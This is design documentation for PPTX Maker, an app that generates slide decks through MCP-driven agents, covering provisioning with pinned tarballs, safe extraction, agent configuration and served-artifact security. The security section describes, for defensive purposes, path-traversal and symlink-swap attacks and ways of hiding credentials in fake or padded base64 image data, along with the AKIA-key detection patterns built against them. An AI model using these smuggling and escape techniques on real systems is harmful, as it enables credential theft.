# PPTX Maker Module

## Overview

PPTX Maker is an opt-in (`defaultEnabled: false`) built-in app that generates
real `.pptx` presentations from a chat conversation. An agent interviews the user,
writes a brief, an outline and an art direction, then composes each slide and
produces the file — and the dashboard page shows every deliverable appearing as
it is written, with slides rendered as animated SVG while they compose.

Slide composition and `.pptx` writing are NOT implemented here. They are done by
[spec-driven-presentation-maker](https://github.com/aws-samples/sample-spec-driven-presentation-maker)
(AWS Samples, MIT-0), a public open-source engine that is **fetched as a
sha256-pinned tarball into the app's data dir on first use and never modified**.
This app supplies the KiroCrew integration: the agents that drive the engine over
MCP, the studio page, and the deck / style / template API.

**Nothing has to be installed by hand.** `pip install kirocrew` is the only
prerequisite: `uv` is a declared Python dependency resolved through the installed
package, and the engine arrives over plain HTTPS, so `git` is not required. See
Provisioning.

Attribution: the app was originally written by **sktok** as a standalone app and
ported here. See `src/kiro_crew/apps/builtins/pptx_maker/ATTRIBUTION.md`.

Platform: `macos` + `linux` (the engine's toolchain assumes a POSIX venv layout).
The Python imports cleanly on Windows — the manifest gate is what withholds it.

## Architecture

```
chat session (sdpm-spec / sdpm-vibe / sdpm-style)
  └─ @sdpm/* MCP tools ──► vendored engine (uv venv, pinned tag)
                              └─ writes decks to the deck root
                                    ▲
dashboard page ──► /api/apps/pptx-maker/* ──┘  (reads only)
```

The page **never** generates a deck. It reads what the engine wrote and manages
the style/template library. Generation happens in the real chat surface, so the
user gets the full native chat (follow-up chips, question cards, tool groups)
instead of a reduced embed.

## Routes

All routes live under `/api/apps/pptx-maker/` and are registered by
`apps/builtins/pptx_maker/backend/routes.py:register_routes`. Every handler is
wrapped in `_require_enabled` (403 when the app is disabled).

| Method | Path | Purpose |
|--------|------|---------|
| GET | `/engine` | Engine readiness (`clone`/`venv` probes) + the provisioning job's state, log tail and pinned tag |
| POST | `/engine/provision` | Fetch the engine at the pinned digest, build its venv, and install the managed `pdftoppm` launcher. 202 + poll `/engine`; idempotent |
| GET | `/deps` | Optional preview binaries (`soffice`, `pdftoppm`): `present`/`missing`/`managed` plus a per-OS install `hints` command for the ones the app will not install — reports only |
| GET | `/assets` | Icon-pack provisioning status, keyed on the engine tag |
| POST | `/assets/provision` | Download the engine's bundled icon packs (`?force=true` to redo) |
| GET/PUT | `/config` | The deck output directory. The PUT accepts **only** `deckRoot` (exact key equality) and writes `output_dir` into the ENGINE's own config |
| GET | `/decks` | Deck list, newest id first, capped at `MAX_DECKS` (500) |
| GET | `/deck?id=` | One deck's deliverables, slides and `updatedAt` map |
| GET | `/preview/{deckId}/{subpath}` | One deck artifact (see Serving Deck Artifacts) |
| GET | `/styles` | Style library, each row with a cover-slide thumbnail |
| GET | `/style?name=` | One style's full HTML |
| POST | `/styles/import` | Create a user style from the raw body |
| POST | `/styles/rename` | Rename a user style (carries its pin across) |
| POST | `/styles/pin` | Pin/unpin a style so the agent prefers it |
| DELETE | `/styles?name=` | Delete a user style (drops its pin) |
| GET | `/templates` | Template library with analyzed theme colours/fonts/layouts |
| POST | `/templates/import` | Create a user template and analyze it |
| POST | `/templates/rename` | Rename a user template (carries its metadata across) |
| DELETE | `/templates?name=` | Delete a user template (drops its metadata) |

**No dependency-install endpoint exists, deliberately.** The upstream app shelled
out to `brew`/`apt-get` from a browser request; installing a system package is a
privileged host mutation, so the UI shows the command and the user runs it. A test
pins the absence of `POST /deps/install`. That decision is unchanged, and
`POST /engine/provision` is not a counter-example: it invokes no package manager
and elevates nothing, writes only inside this app's own data dir, installs bytes
verified against a sha256 pin, and is reversible by deleting one directory. It is
the same distinction `papyrus`'s managed Tectonic install draws.

### Preview tools (`soffice`, `pdftoppm`)

Slide thumbnails are a two-step pipeline the engine drives by shelling out **by
name**: `soffice` converts the `.pptx` to PDF, then
`pdftoppm -png -scale-to 1280 <pdf> <dir>/page` rasterizes it and the engine globs
`page-<N>.png` back. Neither tool is on a stock machine, and the engine resolves
both with `shutil.which()` **in its own subprocess** — so anything this app
provides must land on the *child's* `PATH`, not the gateway's.

The two are handled differently, because only one of them can be installed
honestly:

- **`pdftoppm` — provided, on every OS, with no download.** `pypdfium2` is already
  a dependency of the engine's own venv, so the capability is on disk the moment
  the engine is provisioned; what was missing was a command of that name.
  `preview_tools.install_pdftoppm()` writes a launcher (`pdftoppm`, or
  `pdftoppm.cmd` on Windows so `shutil.which` resolves it via `PATHEXT`) that
  execs the engine interpreter against `pdftoppm_shim.py`. The shim implements
  only the flags the engine passes (`-png`, `-scale-to`, `-r`, `-f`, `-l`) and
  **refuses anything else** rather than mis-rendering, and reproduces poppler's
  1-based, unpadded `page-<N>.png` naming exactly, since the engine's own regex
  depends on it. It runs inside the provision step, not behind an endpoint, so no
  browser request installs anything. The launcher names the interpreter and the
  shim FILE directly — never a venv console script, whose shebangs point at the
  staging dir the install swapped away and are therefore unrunnable.
- **`soffice` — reported, never installed.** LibreOffice publishes only OS
  installers, one per platform and none of them an unpack-and-run tree: a ~283MB
  `.dmg` (needs `hdiutil`), a ~207MB tarball that is really **42 `.deb`
  archives**, and a ~355MB `.msi` whose single cab is **LZX-compressed**, which
  the Python stdlib cannot decompress at all (`msilib` was removed in 3.13). So
  the Windows leg has no in-stdlib path even before the ~730MB unpacked footprint
  and the per-platform digest maintenance are considered, and macOS headless
  conversion — exactly how a gateway would invoke it — was only enabled upstream
  after the current stable. Digests are pinnable (`.sha256` sidecars exist beside
  each artifact, which the mirror redirect makes mandatory rather than optional),
  so this is a cost-and-coverage decision, not an integrity one: shipping it
  would mean a partial, platform-asymmetric installer for a tool the user can get
  in one command. `/deps` therefore returns a per-OS `hints` command and the user
  runs it.

  `conda-forge` poppler was rejected on the same axis rather than for integrity:
  the tree IS relocatable (`@loader_path`/`$ORIGIN`), but it is not
  self-contained — poppler alone dies with `dyld: Library not loaded:
  @rpath/liblcms2.2.dylib`, and closing the dependency graph took ~31 packages
  and ~133MB unpacked, i.e. ~31 digests to maintain per platform.

**Which PROCESS sees the managed dir is the whole problem.** `pdftoppm` and
`soffice` are invoked *by name* from `skill/sdpm/api.py`, which runs inside the
engine's **`sdpm` MCP server** — a process **kiro-cli** spawns from the rendered
agent config, not any gateway subprocess. `engine._spawn`'s children only ever run
the metadata snippets and the icon scripts, so a `PATH` overlay applied there
reaches a child that never rasterizes anything. The managed dir therefore has to
be on the `PATH` declared in `mcpServers.sdpm.env` of the four `agents/*.json`
templates, rendered from the `{TOOLS_PATH}` placeholder by **both** renderers
(`provision._render_agents` and the gateway's `bridges._placeholder_values`, which
compute it identically via `provision.mcp_tools_path()`).

**A user's own install always wins**, which takes two things pointing the same way:

1. `engine.optional_dep_path()` probes `PATH` before the managed dir. This governs
   what `/deps` REPORTS.
2. `mcp_tools_path()` **appends** the managed dir to the inherited `PATH`. This
   governs what actually EXECUTES. Prepending would let the shim shadow a real
   poppler — silently downgrading a full tool to the shim's compatibility subset
   while `/deps` still reported the system one. It also never emits an empty
   `PATH` element, since an empty element means the CWD on POSIX and would make
   tool resolution depend on where the MCP server was started.

**`install_pdftoppm()` runs BEFORE `_render_agents()`** inside `provision()`, and the
order is load-bearing: `mcp_tools_path()` only adds the managed directory once it
exists, so rendering first baked a `PATH` without it on every first-ever provision.
The launcher then landed in a directory no agent config named, thumbnails stayed
broken until the next gateway boot re-rendered, and `/deps` reported the tool
present the whole time because it probes the directory directly.

`TestRenderAgents` pins all of this at the layer that matters: it asserts the
engine's own `shutil.which()` against the RENDERED `env.PATH`, and asserts the
install-then-render call order. Deleting the template's `PATH`, flipping the append
order, or restoring the old install-after-render order each fail a test. Asserting
only on a gateway-side overlay dict caught none of them.

This mirrors the precedence `papyrus.latex.find_compiler_sync` gives a real TeX
distribution over managed Tectonic, but the mechanism differs: `papyrus` never
mutates `PATH` at all (it invokes the compiler by absolute path), so it has no
equivalent of step 2. `/deps` derives `present` and `missing` from the single
resolver in step 1 (so they cannot disagree) and flags which entries are `managed`.

### Error responses

Every non-2xx JSON body is `{"error": "<English prose>", "code": "<lower_snake>"}`.
`code` is the contract the dashboard switches on; `error` is advisory prose the UI
may show but must not parse (RFC 9457 3.1.3). Enforced by
`test/test_error_code_contract.py`.

The identifier is minted where the condition is detected — in `library.py`'s
`(status, payload)` returns and in `_write_deck_root` — so it sits next to the `if`
that produced it. `routes._worker_response` is the one boundary that re-emits those
pairs; it dispatches on the status through a ladder of literal-status returns,
repeating the dict literal in each branch, because a computed `status=` or a
variable body is opaque to the contract scanner.

| Code | Condition | Status |
|------|-----------|--------|
| `app_disabled` | The app is not enabled | 403 |
| `body_not_json` | Request body is not JSON | 400 |
| `body_not_object` | Request body is JSON but not an object | 400 |
| `unexpected_config_key` | `PUT /config` body has a key other than `deckRoot` | 400 |
| `invalid_deck_root` | `deckRoot` is absent, not a string, blank, unresolvable, or on/containing a sensitive path | 400 |
| `invalid_pinned` | `pinned` is not a boolean | 400 |
| `missing_deck_id` | `GET /deck` without `?id=` | 400 |
| `missing_name` | `GET /style` without `?name=` | 400 |
| `invalid_style_name` / `invalid_template_name` | Name fails the segment allow-list or escapes the library dir | 400 |
| `not_html` | Imported style contains no markup | 400 |
| `not_pptx` | Imported template is not a zip (no `PK` magic) | 400 |
| `deck_not_found` / `artifact_not_found` | No such deck, or the artifact is not a servable file | 404 |
| `style_not_found` / `template_not_found` | No such user style/template | 404 |
| `style_exists` / `template_exists` | Import or rename would overwrite an existing name | 409 |
| `engine_config_corrupt` | The engine's existing config is not valid JSON | 409 |
| `payload_too_large` | Upload exceeds `MAX_STYLE_BYTES` / `MAX_TEMPLATE_BYTES` | 413 |
| `style_write_failed` / `style_rename_failed` / `style_delete_failed` | Filesystem error on a style mutation | 500 |
| `template_write_failed` / `template_rename_failed` / `template_delete_failed` | Filesystem error on a template mutation | 500 |
| `pin_write_failed` | `state.json` write failed | 500 |
| `engine_config_write_failed` | Engine config write failed | 500 |
| `engine_not_ready` | The engine's user config dir is unavailable | 503 |

## Storage

The app writes nothing of its own except the engine checkout. Decks, styles,
templates and pins all live where the ENGINE puts them, so the two can never
disagree about state.

```
~/.kiro/crew/apps/pptx-maker/
  app.json, installed.json          # platform-written
  data/vendor/sdpm/                 # the pinned engine tree + its uv venv
    .kirocrew-engine.json           #   tag/commit/digest of the verified install
  data/vendor/preview-tools/bin/    # managed preview tools; prepended to the
    pdftoppm (or pdftoppm.cmd)      #   engine child's PATH, never the gateway's
  agents/*.json                     # rendered from the shipped templates
  prompts/                          # staged from the package at provision time

<engine user config>/               # $XDG_CONFIG_HOME/sdpm, else ~/.config/sdpm
  config.json                       # output_dir (the deck root)
  state.json                        # pinned_styles, template_metadata
  styles/*.html, templates/*.pptx   # the user's library
  assets/{aws,material}/            # icon packs + .pptx-maker-provisioned.json

<deck root>/<deck-id>/              # engine-owned layout
  deck.json, specs/{brief,outline,art-direction}.*
  slides/<slug>.json, compose/<slug>_<epoch>.json, compose/defs_<epoch>.json
  preview/page<N>-*.png, output.pptx
```

`deck_root()` resolves on every call — env override (`KIROCREW_PPTX_DECK_ROOT`,
dev/test only), then the engine config's `output_dir`, then the engine default.
Not cached, because the user can change it from Settings and a cached value would
keep serving the old tree until a gateway restart.

A brand-new install seeds `output_dir` to `~/.config/sdpm/decks`. The engine
defaults to `~/Documents`, which on macOS sits behind a file-access prompt the
gateway cannot answer — a first-run deck would fail with a permission error the
user cannot act on. An existing config or existing decks are never touched.

## Provisioning

**A failed swap never leaves the user with no engine.** `_swap_in` moves the new
tree next to the destination, moves the old one aside, then renames the new one into
place. If that last rename fails, the retired tree is the ONLY remaining copy — so it
is restored before unwinding, and removed only once `engine_root` is populated again.
An unconditional cleanup deleted both and turned a failed *update* into a broken
install; the contract is the same one `_ensure_clone` already promises on a network
failure, namely "still on the previous version". Pinned by
`test_pptx_maker_engine_source.py::TestSwapRollback`.

The `finalize` callback runs at the FINAL path while the retired tree is still on
disk — the one window a step needing the real path can be undone — and **a finalizer
that RAISES takes the same unwind as one that returns False.** Anything else was
silent data loss: the exception escaped the finalize branch, the `except OSError`
handler restores only when `engine_root` does not exist (and the new tree is sitting
there), so the `finally` saw a populated root and deleted the retired tree — removing
the user's working engine and leaving an unfinalized one in its place. A
non-`OSError` was not covered at all. The rollback catches `BaseException`
deliberately: with the only engine moved aside, the tree must go back even on
`KeyboardInterrupt`, and the exception is re-raised afterwards so nothing is
swallowed. On a FIRST install the new tree is still removed rather than left in
place, so no source marker survives to make `is_installed()` short-circuit the retry.

`backend/provision.py` resolves `uv`, fetches and verifies the engine tree
(`backend/engine_source.py`), runs `uv sync`, reinstalls the engine's skill package
**editable** (a normal install drops its sibling data dirs, so bundled styles and
templates would silently vanish), stages this app's prompt files into the
install dir, and renders the agent templates against the resolved engine paths.

**It does NOT register those resources.** The enable path and the boot reconcile both
call `bridges.register_app`, and `bridges._placeholder_values` computes this app's
`{UV_BIN}` / `{ENGINE_ROOT}` / `{ENGINE_MCP_DIR}` / `{APP_PROMPTS}` in the GATEWAY from
the data home and the installed package — the same values the provisioner resolves — so
the agents and skill land without the provisioner registering anything. Registering here
was redundant AND an unclosable race: provisioning is a detached job that runs for
minutes, so an operator can disable the app mid-run, and the enable re-check cannot be
atomic (the lifecycle lock is an `asyncio.Lock`; this runs synchronously on a worker
thread). A disable that deregisters and *then* sets `enabled=false` reads as
still-enabled, and registering recreates the agent and MCP configs the disable had just
removed — leaving a DISABLED app with live, callable resources. Not registering removes
the window instead of narrowing it. `_register_resources` is kept as the seam its
disable-check tests drive. Pinned by
`test_pptx_maker_provision.py::test_provisioning_does_not_register_resources_itself`.

It is a Python job rather than a `setup.onInstall` script because the platform
does not stage a BUILTIN app's non-manifest files into `~/.kiro/crew/apps/<name>/`
— a shell script would have nothing to run there, and a manifest-declared
`agents` path would point at a file that does not exist. Provisioning is
user-triggered (it downloads a third-party tree and builds a venv) and idempotent.

The **skill** is not part of provisioning: it lives in
`src/kiro_crew/builtin_skills/pptx-maker/SKILL.md` (bundled, NOT the repo-only
top-level `skills/`), which the gateway copies into the user's skills dir on
every start. So it reaches every `pip`/DMG install whether or not the engine has
been provisioned, per the skill-bundling rule in `AGENTS.md`. The manifest
therefore declares **no** `skills` entry — the same choice, for the same reason,
as `papyrus`.

### Resolving `uv` — never by name

`uv` is a declared Python dependency (`setup.cfg` `install_requires`), so a stock
`pip install kirocrew` always HAS the binary — but not necessarily on `PATH`: a
wheel install puts it in the venv's scripts dir, and the gateway may run with a
minimal `PATH` (an installed launchd/systemd service). `provision.resolve_uv()`
therefore resolves it through the installed package and hands the two `uv` call
sites an **absolute path**, never the bare string `"uv"`. Order, widest-trust
first, cached process-wide:

1. `uv.find_uv_bin()` — the wheel's own locator (the normal `pip` case). It raises
   `UvNotFound`, a `FileNotFoundError` subclass, on an odd repackaging;
2. the **frozen-bundle location** — `sys._MEIPASS` and `dirname(sys.executable)`,
   joined with `uv` + `sysconfig`'s `EXE`. This is the DMG/Electron path:
   PyInstaller's bundle has no scripts dir and no site-packages, so the wheel's
   locator cannot find anything there, and `packaging/kirocrew-backend.spec` stages
   the binary at the bundle root instead;
3. `shutil.which("uv")` — a user's own, possibly newer, uv still works;
4. `None`, which fails provisioning with a message naming **only** `uv` (the old
   check said "`git` and `uv` must both be installed and on PATH" even when only
   one was missing, and `git` is no longer used at all).

`resolve_uv()` never raises: provisioning is a detached background job whose only
channel to the user is its log.

### Why the engine is a sha256-pinned tarball, not a `git clone`

Provisioning BUILDS (`uv sync` compiles wheels) and then EXECUTES this
third-party code, so what decides which bytes arrive is the whole security story.
Two problems with cloning:

**A git tag is a mutable ref.** If the pin were the tag alone, an upstream
force-move — malicious or an innocent re-tag — would silently change the code
every future provision runs, while `git describe` still reported `v0.3.8` and
existing installs reported "already up to date". On a public project that is
silent arbitrary code execution across the installed base. The clone flow did
guard this by checking `git rev-parse HEAD` against `ENGINE_COMMIT`, but that
verified the commit id the SERVER reported for the tree it had just handed over.

**`git` is a system prerequisite.** There is no `git` on PyPI, and it is far less
universal than it looks — a slim Docker image, a fresh Windows box or a
locked-down host may have none. Requiring it contradicts "`pip install kirocrew`
and nothing else".

So `engine_source.py` downloads
`https://github.com/<owner>/<repo>/archive/<ENGINE_COMMIT>.tar.gz` over plain
HTTPS and verifies a **sha256 over the received bytes**
(`ENGINE_TARBALL_SHA256`) before anything is extracted. That digest is the trust
anchor; the commit is the locator and `ENGINE_TAG` is display-only (it never
appears in the URL, so it cannot influence which bytes arrive). Bumping the
engine means bumping all three together — bumping the commit alone fails
verification on every host, which is the intended failure mode.

This is viable because a GitHub `/archive/` tarball is byte-stable for a fixed
commit sha; the digest was confirmed by downloading the artifact four times and
reproducing it each time.

Failure behaviour, all of which keeps a working older engine rather than a
half-removed one:

- **digest mismatch** → the staged bytes are deleted and provisioning fails
  loudly, so no unvetted tree is left for a later step or a retry to build;
- **hostile archive** (see below) → same, and nothing is written outside the
  scratch dir;
- **not the engine** (no single top-level dir, or no `mcp-local/`) → refused;
- **network failure with a tree already present** → the existing tree is
  untouched. The new tree is only swapped into place after a verified extraction,
  so `engine_root` is never partially replaced.

`ENGINE_URL_ENV` (`KIROCREW_PPTX_ENGINE_URL`) allows a mirrored/air-gapped
source. It must be `https://` (so an operator value cannot read local files or
fetch plaintext) and the digest still gates it, so an override changes only WHERE
the bytes come from, never WHICH bytes are accepted. `SKIP_DOWNLOAD_ENV` makes a
test run refuse before touching the network.

### Safe extraction

`tarfile.extractall` writes wherever a member name points, which makes any
downloaded archive a path-traversal sink. Every member is validated before it is
written, using stdlib's own `filter=` hook so the check runs INSIDE `extractall`
(no TOCTOU gap between validating a member list and writing it). Python 3.10 —
still supported — has no `filter` keyword, so the `TypeError` fallback applies the
same callable to every member and restricts the extraction to the validated list.
Refused: absolute POSIX and Windows/UNC names, any `..` segment, NUL bytes, empty
names, anything that is not a regular file or a directory (a symlink or hardlink
can escape even when its own name looks innocent), oversized members, and an
archive whose members expand past a total ceiling. Ownership and permission bits
are dropped, so an upstream setuid or group-writable bit cannot survive install.

### How readiness is probed without a `.git`

`engine_source.write_source_marker()` writes `.kirocrew-engine.json` (tag, commit,
digest, repo) into the tree as the **last** step of a verified install, so its
presence is the "this is the vetted tree" signal that `(root / ".git").is_dir()`
used to provide. `is_installed()` requires BOTH the commit and the digest to match
the current pin, so bumping either makes an existing install re-fetch instead of
silently keeping an older engine, and a tree left behind by an older git-based
install (no marker) correctly reads as "not installed".

`engine.engine_tag()` reads that marker instead of shelling out to `git
describe` — cheap enough for the status endpoints that call it on every poll, and
**honest**: an unverified or absent tree reports `"unknown"` rather than the tag
this code happens to be pinned to. The `/engine` response keeps its `clone` key
as the wire name the dashboard already reads; what it now reports is
`engine_source.is_installed`.

## Agents

Four agent templates ship with the app, rendered at provision time
(`{ENGINE_ROOT}` / `{ENGINE_MCP_DIR}` / `{APP_PROMPTS}` placeholders) and
namespaced by the platform as `pptx-maker/<name>`:

Every substituted value is **JSON-escaped** (`provision._json_escape`) because the
placeholders sit inside JSON string literals. This is not cosmetic: each value is
an absolute path, so on Windows it is full of backslashes (`C:\Users\…`) where
`\U`/`\c` are invalid JSON escapes. A raw substitution therefore made the
`json.loads` validation below reject *every* template, and a Windows user was
provisioned **zero** agent configs. Pinned by
`test_pptx_maker_provision.py::TestRenderAgents`, which simulates a backslash
path (and a quote) on every platform rather than only on Windows.

| Agent | Role |
|-------|------|
| `sdpm-spec` | Briefing → outline → art direction with the user, then delegates composition |
| `sdpm-vibe` | Fast deck from a URL / pasted text / short brief |
| `sdpm-composer` | Autonomous slide composition; a sub-agent of the two above |
| `sdpm-style` | Creates a reusable style guide through conversation |

**App-owned prompt guidance lives in `prompts/spec-studio.md`**, loaded as an
agent `resource`. The upstream app patched the vendored engine prompt in place on
every install, which meant an engine upgrade silently reverted the customization.
Keeping it in a separate file is what lets the engine stay an unmodified,
replaceable dependency. The file covers: reply in the user's language, how to open
a session, KiroCrew's `[OPTIONS: …]` question affordance in place of the engine's
web-only `hearing` tool, and writing each deliverable incrementally so the studio
can show it.

None of the four declares `autoApprove` on its MCP server. kiro-cli approves an
autoApproved MCP tool locally and emits no permission request, so
`hooks.on_tool_call` — the PreToolUse gate carrying the deny floor, the
sensitive-path check and the governance ceiling — would never be reached.

## Security Controls

- **Path containment (the app's boundary).** Deck artifacts are SERVED to a
  browser from a directory the engine writes into, so `backend/paths.py` is the
  single sanitizer: every request-derived path goes through a `resolve_*` helper
  that returns a provably-contained path or `None`, and callers must use the
  return value. Two independent guards: each path SEGMENT must match
  `SEGMENT_RE` (so `..`, separators and dotfiles cannot appear), and the result
  must still be inside the root after `resolve()` follows symlinks. The second
  guard is what stops a symlink planted inside a deck, which the first cannot see
  through.
- **Served-artifact allow-list.** `/preview` serves only `.json`, `.svg`, `.png`,
  `.md`, `.html` and `.pptx` (`SERVED_SUFFIXES`), each with its own Content-Type,
  `no-store` and `X-Content-Type-Options: nosniff`. Deck contents are ultimately
  model-influenced, so an unexpected extension has no business reaching a browser.
  HTML artifacts additionally carry `default-src 'none'` CSP.
- **Agent-authored IDENTIFIERS are refused, not redacted.** These fields name a
  filesystem path AND a URL segment the browser sends back, so scrubbing them would
  hand out a handle that resolves to nothing. Refusal is scoped as narrowly as the
  identifier allows:
  - the **deck id** (`paths.resolve_deck_dir`) — refuses the whole deck;
  - a **slide slug** (`decks.deck_detail`) — skips that slide, the rest still renders.
    Screened at the slide level *as well as* in the URL builder because the slug is
    also the rendered LABEL, so it leaks even when both of its URLs are refused;
  - **every artifact URL segment** (`decks._preview_url`) — returns `None`, so the one
    link is dropped and the deck stays listed.

  Everything reachable only inside a URL — preview and compose filenames, the spec
  filenames, `output.pptx` — is covered by the `_preview_url` screen alone. **That
  central placement is the point:** this was the identical defect three times running
  (`deckId`, then the slide slug, then a preview PNG filename), each time one field
  over from the last fix, so the check now sits at the single place all seven callers
  build a URL rather than at the callers.

  The slug case is reachable only through `_slide_order`'s FALLBACK: `outline.md`
  slugs match `[a-z0-9-]+` and cannot spell an access key, but with no outline the
  slugs come from the slide FILENAMES, which `SEGMENT_RE` permits as `[A-Za-z0-9._-]`.
- **Credential redaction on served artifact text.** Every deck artifact is written
  by the presentation-engine agent from model output, so a TEXTUAL one crossing
  `/preview` is agent content reaching a user surface — the same boundary
  `decks.py` already redacts the deck NAME and the brief PREVIEW at. Serving the
  same files' full contents raw was therefore an inconsistent hole, not a
  deliberate exemption: a credential the model echoed into a brief, an outline or a
  compose payload reached the dashboard verbatim. `_read_artifact` now runs
  `security.redact` (credentials + exfiltration URLs) over the textual suffixes.
  Three properties make this safe in both directions:
  - **The text/binary split is data, not a code path.** `SERVED_SUFFIXES` maps each
    suffix to a frozen `ServedSuffix(content_type, text=…)`. `text` has no default,
    so a future extension cannot be added without declaring its side — a new
    textual suffix silently inheriting "binary, unredacted" is exactly how this
    hole would reopen. `.json`/`.md`/`.html`/`.svg` are text; `.png`/`.pptx` are
    **byte-identical by contract** (a `.pptx` is a zip, a `.png` a compressed
    bitmap, and rewriting a byte inside either corrupts the deck).
  - **Inline raster art is excised around the pass** (`_INLINE_BITMAP_RE`). This is
    load-bearing, not a concession. The engine re-encodes embedded art as
    `data:image/webp;base64,…`, and `redact_credentials`' bare-secret heuristic
    redacts any 40-char window of random base64 — which a random raster always
    contains. Measured: a naive `redact()` over a compose payload carrying a 20 KB
    raster replaced the whole image with `[REDACTED: credential]` **100% of the
    time**, blanking every picture in every deck while looking perfectly secure —
    the same looks-secure-renders-blank class as the two regressions the SVG scrub
    records. Excision is sound because inline bytes issue no request and so cannot
    carry deck text anywhere, a credential written as prose sits outside the URI and
    is still scanned, and an encoded credential is still caught by the redactor's
    decode-and-scan pass. `image/svg+xml` is excluded from the subtype list (a
    document, not a bitmap; the engine never emits it), and the placeholder carries
    a per-process random nonce so artifact text cannot forge one.
    **The carve-out is verified, not trusted.** A `data:image/...;base64,` label is
    written by the same agent as the rest of the artifact, so it is a claim rather
    than a fact — and `AKIA…` is entirely base64-alphabet, so excising on the label
    alone would turn the carve-out into a smuggling channel (wrap a key in a fake
    bitmap URI and skip the scanner). A blob is therefore excised only if its
    decoded head actually begins with a real raster signature (`_BITMAP_MAGIC` /
    `_is_real_bitmap`: PNG, JPEG, GIF, RIFF/WebP, BMP, and the offset `ftyp` box for
    AVIF/HEIF). Anything else stays in the text and is scanned as ordinary prose.
    Both directions are pinned per format: a fake bitmap body cannot carry a
    credential, and every real signature survives.
    **And the signature is necessary, not sufficient.** A correct header only proves
    the first eight bytes, while every container here (PNG `tEXt`, JPEG `COM`, EXIF,
    WebP `XMP `) has a metadata chunk that holds arbitrary text — so a blob beginning
    `\x89PNG…` and continuing `tEXtComment\0AKIA…` passed the header check, skipped
    the scan, and reached the browser verbatim. `_is_real_bitmap` therefore decodes
    the WHOLE body and exempts it only if the redactor finds nothing in it; a
    credential-bearing "image" stays in the redaction path and loses the picture,
    which is the right trade. Pinned by
    `::test_a_credential_in_bitmap_metadata_is_not_exempted` and
    `::test_a_clean_raster_is_still_exempted`.
    **The ENCODED body is screened as well as the decoded bytes, and the stash holds a
    re-encoding of what was scanned.** A credential APPENDED to a genuine raster's
    base64 is itself base64-alphabet text, so `_INLINE_BITMAP_RE` swallows it, the head
    still carries a real signature, and decoding the appended ASCII yields binary
    NOISE — so the decoded-bytes scan legitimately passes. Restoring `match.group(0)`
    then reproduced the key byte-for-byte. Both halves of the fix are load-bearing:
    `_scanned_bitmap_bytes` returns the validated BYTES (so the caller can only restore
    what was cleared, and anything the decoder discarded is discarded too), and it also
    runs `_ENCODED_CREDENTIAL_RE` over the encoded text. That screen is deliberately
    NARROW rather than a full `redact()`: the bare-secret heuristic flags a 40-char run
    of random base64, which every genuine raster contains — measured, it refused 300/300
    real 20 KB rasters, i.e. it would blank every image in every deck.
    **The scan matches exactly one shape, and requires its body.** `AKIA`/`ASIA` plus 16
    upper/digit chars is the only credential form expressible entirely in the base64
    alphabet, so it is the only one that can hide in a body and be reproduced by the
    re-encode; chance collision is ~1.6e-7 per 20 KB. Every other provider marker needs
    a separator absent from base64 and therefore cannot occur in a body at all — listing
    those here would be dead code, which is what the earlier bare-prefix alternatives
    effectively were: `xox[abposr]` matched 0.88% of 20 KB rasters and 4.7% of 100 KB
    ones by chance, silently blanking real pictures.
    **The carve-out requires the URI to TERMINATE at the body.** `_INLINE_BITMAP_RE`
    captures, as group 2, the maximal run of characters after the base64 that are NOT in
    `_BITMAP_URI_TERMINATORS` (`"`, `'`, `` ` ``, `)`, `<`, `>`, `,`, `;`, `]`, `}`, `\`,
    whitespace). An empty group 2 means the URI ends properly and the exemption applies;
    a non-empty one means something is glued to the URI, and the body **plus the whole
    run** is excised. Both halves of that matter. An allowlist is the only closed form —
    a credential appended to the body splits at whatever separator it uses (`xoxb-`,
    `pypi-`, `ghp_`, a JWT's `.`, a bare `:` or `~`), the prefix landing in the BODY and
    surviving the re-encode while the remainder escapes the scan, so enumerating
    separators is endless while legal terminators are finite. And excising the whole run
    rather than the body alone is what makes it complete: dropping only the body left a
    PyPI macaroon's 49-char tail in the served text once its `pypi-` prefix had gone into
    the excised blob. Handing the region to the text pass does not help either — the
    bare-secret heuristic eats the base64 run and stops at the separator. This deletes
    text when the run is innocent, but a `-`/`.`/`:`-led run glued to a data URI is not a
    shape the engine emits, the deletion is signposted by the tag rather than silent, and
    the alternative is serving credential material. The terminator is outside the match,
    so the surrounding document keeps its quote or bracket. Pinned by
    `::test_a_uri_the_body_does_not_terminate_forfeits_the_carve_out` (JWT, `pypi`,
    `glpat`, `:` and `~` — none enumerated anywhere — asserting no 8-char FRAGMENT
    survives, since a full-token assertion passed while a tail still shipped) and
    `::test_every_legal_uri_terminator_keeps_the_image` (JSON quote, escaped quote, CSS
    `url(...)`, markdown, end-of-text all round-trip byte-identical).
    **A condemned region is excised here, not delegated.** Handing it to the text pass
    assumed `redact()` recognises the same tokens this scan does; it recognises fewer
    (a `gh[pousr]_` body shorter than a real 36-char PAT matches here and is invisible
    there), so delegating served those tokens. `_scanned_bitmap_bytes` returns
    `(bytes, credential_found)` and the caller replaces a credential-bearing region
    with the shared `REDACTED_CREDENTIAL_TAG`, while a blob that merely is not a raster
    still falls through to ordinary prose scanning. Pinned by
    `::test_a_credential_APPENDED_to_a_real_raster_is_not_exempted`,
    `::test_appended_tokens_whose_separator_is_not_base64_are_caught`,
    `::test_a_raster_whose_base64_contains_a_token_prefix_still_renders` and
    `::test_text_butted_against_a_data_uri_is_not_silently_dropped`.
  - **Decode degrades, never crashes.** Text is decoded `errors="replace"` and
    re-encoded to UTF-8; a malformed byte sequence cannot raise on the worker
    thread and become an opaque 500. The declared Content-Type carries
    `charset=utf-8` for every textual suffix because that is what the body now
    actually is, and it is set via the response HEADER (aiohttp refuses a charset in
    the `content_type=` kwarg, which previously truncated it). Redaction changes
    byte length, which is why `MAX_ARTIFACT_BYTES` is checked on the READ — the
    resource actually being bounded — and no `Content-Length` is set by hand;
    aiohttp derives it from the final body, so it can never be a stale
    pre-redaction size.
  `_read_artifact` (called through `off_loop`) is the ONE path deck-artifact bytes
  reach a browser: there is deliberately no `web.FileResponse`/`sendfile` leg that
  would re-open the file and bypass the allow-list, the size cap and this pass. The
  redaction is pure CPU over a bounded string and lives INSIDE that offloaded
  helper, never on the event loop.

  **The read is pinned to the OPENED INODE, not to the path.** `_read_artifact` goes
  through `hooks.safe_read_file_bytes_nolink` with the deck directory as
  `within_root`. A bare `os.open(..., O_NOFOLLOW)` is NOT sufficient here: it makes
  only the FINAL component's symlink-ness fatal, so an INTERMEDIATE directory swapped
  for a symlink between `resolve_deck_file` and the open still escapes the deck —
  demonstrated by replacing `compose/` with a link to a credential directory after
  resolution, which served that directory's file. The helper opens first and then
